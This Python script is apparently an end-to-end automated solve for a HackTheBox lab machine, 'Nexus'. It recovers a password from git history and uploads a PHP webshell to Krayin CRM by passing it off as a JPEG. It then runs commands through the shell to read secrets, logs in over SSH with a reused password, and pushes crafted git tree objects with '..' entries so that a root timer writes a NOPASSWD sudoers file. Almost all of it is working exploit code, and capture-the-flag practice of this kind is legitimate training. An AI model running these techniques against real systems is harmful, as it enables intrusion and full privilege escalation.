#!/usr/bin/env python3
"""
htb_nexus_solve.py — Standalone Autonomous Solve Script for HackTheBox Nexus.

Chain of Exploitation:
  1. Recon & Leak : Clone public Gitea repo (admin/krayin-docker-setup) and recover scrubbed
                    DB_PASSWORD (N27xh!!2ucY04) from .env git commit history.
  2. Foothold     : Authenticate to Krayin CRM (billing.nexus.htb) as j.matthew@nexus.htb.
                    Bypass TinyMCE file upload restrictions to drop a PHP webshell -> RCE as www-data.
  3. Extraction   : Read production /var/www/krayin/.env to harvest the unscrubbed DB_PASSWORD (y27xb3ha!!74GbR).
  4. Lateral      : Authenticate via SSH as user `jones` using password reuse -> read user.txt.
  5. Escalation   : Craft custom binary git tree objects with literal '..' path directory entries.
                    Push to a user template repository; wait for the root-owned systemd
                    timer (`gitea-template-sync.service`) to flatten the ls-tree path using os.path.join()
                    without path normalization, dropping /etc/sudoers.d/pwn -> NOPASSWD sudo -> root.txt.

Target: HackTheBox — Nexus (Linux, Easy)
Requirements: requests, paramiko, git (system binary)
Usage:
    python3 htb_nexus_solve.py <TARGET_IP>
"""

import hashlib
import os
import re
import shutil
import subprocess
import sys
import time
import zlib
from urllib.parse import unquote

import paramiko
import requests

EMAIL = "j.matthew@nexus.htb"
GITEA_CRED_SRC = "admin/krayin-docker-setup"
TEMPLATE_REPO = "pwn-template"


# Helpers
def log(tag: str, msg: str) -> None:
    """Print structured log output."""
    print(f"  {tag:<9} {msg}")


def run(cmd: list, **kw) -> subprocess.CompletedProcess:
    """Execute a system command synchronously."""
    return subprocess.run(cmd, capture_output=True, text=True, **kw)


# Stage 1: Recover Gitea history credentials
def gitea_creds_from_history(git_base: str) -> str:
    """Clone the public Gitea repository and recover DB_PASSWORD from .env history."""
    d = "/tmp/nexus_krayin_repo"
    shutil.rmtree(d, ignore_errors=True)
    r = run(["git", "clone", "-q", f"{git_base}/{GITEA_CRED_SRC}.git", d], timeout=60)
    if r.returncode != 0:
        raise RuntimeError(f"Git clone failed: {r.stderr[:200]}")
    r = run(["git", "log", "-p", "--", ".env"], cwd=d, timeout=30)
    m = re.search(r"DB_PASSWORD=([^\s]+)", r.stdout)
    if not m:
        raise RuntimeError("Could not find DB_PASSWORD in git history log")
    return m.group(1)


# Stage 2: Krayin CRM webshell upload & RCE
def krayin_rce(base: str, password: str) -> tuple[requests.Session, str]:
    """Authenticate to Krayin CRM and upload a PHP webshell via TinyMCE endpoint."""
    s = requests.Session()
    r = s.get(f"{base}/admin/login", timeout=20)
    m = re.search(r'name="_token"\s+value="([^"]+)"', r.text)
    if not m:
        raise RuntimeError("Could not locate CSRF _token on Krayin login page")
    token = m.group(1)

    r = s.post(
        f"{base}/admin/login",
        data={"_token": token, "email": EMAIL, "password": password},
        allow_redirects=False,
        timeout=20,
    )
    if r.status_code != 302:
        raise RuntimeError(f"Krayin CRM login failed: HTTP {r.status_code}")

    xsrf = unquote(s.cookies.get("XSRF-TOKEN", ""))
    shell_payload = "<?php system($_GET['cmd']); ?>"
    r = s.post(
        f"{base}/admin/tinymce/upload",
        headers={"X-XSRF-TOKEN": xsrf, "X-Requested-With": "XMLHttpRequest"},
        files={"file": ("shell.php", shell_payload, "image/jpeg")},
        timeout=20,
    )
    m = re.search(r'"location"\s*:\s*"([^"]+)"', r.text)
    if not m:
        raise RuntimeError(f"TinyMCE webshell upload failed: {r.text[:200]}")
    return s, m.group(1).replace("\\/", "/")


# Stage 3: Low-level Git tree object crafting & timer trigger
def write_obj(data: bytes, t: str) -> str:
    """Write a raw Git object (blob, tree, or commit) directly into .git/objects."""
    h = f"{t} {len(data)}".encode() + b"\x00"
    s = h + data
    sha = hashlib.sha1(s).hexdigest()
    d = os.path.join(".git", "objects", sha[:2])
    os.makedirs(d, exist_ok=True)
    p = os.path.join(d, sha[2:])
    if not os.path.exists(p):
        with open(p, "wb") as f:
            f.write(zlib.compress(s))
    return sha


def entry(mode: str, name: str, sha: str) -> bytes:
    """Construct a single Git tree entry binary byte string."""
    return f"{mode} {name}".encode() + b"\x00" + bytes.fromhex(sha)


def craft_traversal_commit() -> str:
    """Build a git commit object containing a literal '..' path components tree."""
    payload = b"jones ALL=(ALL) NOPASSWD: ALL\n"
    blob = write_obj(payload, "blob")
    sudoers_t = write_obj(entry("100644", "pwn", blob), "tree")
    sudoers_d = write_obj(entry("40000", "sudoers.d", sudoers_t), "tree")
    etc_t = write_obj(entry("40000", "etc", sudoers_d), "tree")

    cur = etc_t
    for _ in range(5):
        cur = write_obj(entry("40000", "..", cur), "tree")

    readme = write_obj(b"# pwn template\n", "blob")
    root = write_obj(
        entry("100644", "README.md", readme) + entry("40000", "..", cur), "tree"
    )

    ts = int(time.time())
    commit_body = (
        f"tree {root}\nauthor x <x@x> {ts} +0000\ncommitter x <x@x> {ts} +0000\n\ninit\n"
    ).encode()
    sha = write_obj(commit_body, "commit")

    os.makedirs(os.path.join(".git", "refs", "heads"), exist_ok=True)
    with open(os.path.join(".git", "refs", "heads", "main"), "w") as f:
        f.write(sha + "\n")
    return sha


def push_template_repo(git_base: str, password: str, repo_dir: str) -> str:
    """Create or overwrite template repo via Gitea API and force-push custom commit."""
    auth = ("jones", password)
    requests.delete(f"{git_base}/api/v1/repos/jones/{TEMPLATE_REPO}", auth=auth, timeout=20)
    r = requests.post(
        f"{git_base}/api/v1/user/repos",
        auth=auth,
        json={"name": TEMPLATE_REPO, "auto_init": False, "template": True},
        timeout=20,
    )
    if r.status_code not in (200, 201):
        raise RuntimeError(f"Gitea repo creation failed: {r.text[:200]}")

    os.chdir(repo_dir)
    sha = craft_traversal_commit()
    r = run(
        ["git", "push", "-u", "origin", "main", "--force"],
        env={**os.environ, "GIT_TERMINAL_PROMPT": "0"},
        timeout=60,
    )
    if r.returncode != 0:
        raise RuntimeError(f"Git force push failed: {r.stderr[:300]}")
    return sha


def wait_for_sudoers(ssh: paramiko.SSHClient, timeout: int = 300) -> bool:
    """Poll the target over SSH for the root systemd timer to drop /etc/sudoers.d/pwn."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        _, so, _ = ssh.exec_command("sudo -n -l 2>&1 | grep -c NOPASSWD")
        res = so.read().decode().strip()
        if res and res != "0":
            return True
        time.sleep(15)
    return False


# Main entrypoint
def main() -> int:
    target = sys.argv[1] if len(sys.argv) > 1 else "10.129.234.54"
    billing = "http://billing.nexus.htb"
    git_base = "http://git.nexus.htb"

    print("==================================================")
    print(f"  HTB Nexus Autonomous Solve Script")
    print(f"  Target IP: {target}")
    print("==================================================")

    # 1. Recover Krayin password from public Gitea git history
    print("\n[1/5] Recovering Krayin CRM password from Gitea git history...")
    krayin_pass = gitea_creds_from_history(git_base)
    log("gitea leak", f"DB_PASSWORD = {krayin_pass}")

    # 2. Authenticate to Krayin CRM + upload TinyMCE PHP webshell
    print("\n[2/5] Authenticating to Krayin CRM & uploading webshell...")
    _, shell_url = krayin_rce(billing, krayin_pass)
    log("login", f"{EMAIL} : {krayin_pass}")
    log("webshell", shell_url)
    r = requests.get(shell_url, params={"cmd": "id"}, timeout=20)
    log("RCE", r.text.strip())

    # 3. Read production .env file to harvest jones SSH password
    print("\n[3/5] Extracting production /var/www/krayin/.env file...")
    r = requests.get(shell_url, params={"cmd": "cat /var/www/krayin/.env"}, timeout=20)
    m = re.search(r"DB_PASSWORD=([^\r\n]+)", r.text)
    if not m:
        raise RuntimeError("No DB_PASSWORD string found in production .env")
    jones_pass = m.group(1)
    log("password", f"jones : {jones_pass}")

    # 4. SSH as user jones & read user.txt
    print("\n[4/5] Establishing SSH session as user `jones`...")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(target, port=22, username="jones", password=jones_pass, timeout=20)
    _, so, _ = ssh.exec_command("cat /home/jones/user.txt")
    user_flag = so.read().decode().strip()
    log("user.txt", user_flag)

    # 5. Craft traversal git tree objects, push template repo & await root timer
    print("\n[5/5] Crafting path traversal git tree objects & pushing template repo...")
    repo_dir = "/tmp/nexus_pwn_repo"
    shutil.rmtree(repo_dir, ignore_errors=True)

    r = run(
        ["git", "clone", "-q", f"http://jones:{jones_pass}@git.nexus.htb/jones/{TEMPLATE_REPO}.git", repo_dir],
        timeout=60,
    )
    if r.returncode != 0:
        os.makedirs(repo_dir, exist_ok=True)
        run(["git", "init", "-q", "-b", "main"], cwd=repo_dir)
        run(
            ["git", "remote", "add", "origin", f"http://jones:{jones_pass}@git.nexus.htb/jones/{TEMPLATE_REPO}.git"],
            cwd=repo_dir,
        )

    sha = push_template_repo(git_base, jones_pass, repo_dir)
    log("pushed", f"commit {sha[:8]} -> jones/{TEMPLATE_REPO} (template)")

    r = run(["git", "ls-tree", "-r", "HEAD"], cwd=repo_dir)
    for line in r.stdout.strip().splitlines():
        if "sudoers" in line or "README" in line:
            log("tree", line.split("\t")[-1])

    print("  Polling for root timer execution (60s cadence)...")
    if not wait_for_sudoers(ssh):
        raise RuntimeError("Sudoers drop timed out — check root timer logs")

    log("sudoers", "/etc/sudoers.d/pwn successfully created by root systemd timer!")

    _, so, _ = ssh.exec_command("sudo -n cat /root/root.txt")
    root_flag = so.read().decode().strip()
    log("root.txt", root_flag)

    print("\n" + "=" * 50)
    print("  EXPLOITATION COMPLETE — CAPTURED FLAGS")
    print("=" * 50)
    print(f"  user.txt : {user_flag}")
    print(f"  root.txt : {root_flag}")
    print("=" * 50)
    ssh.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
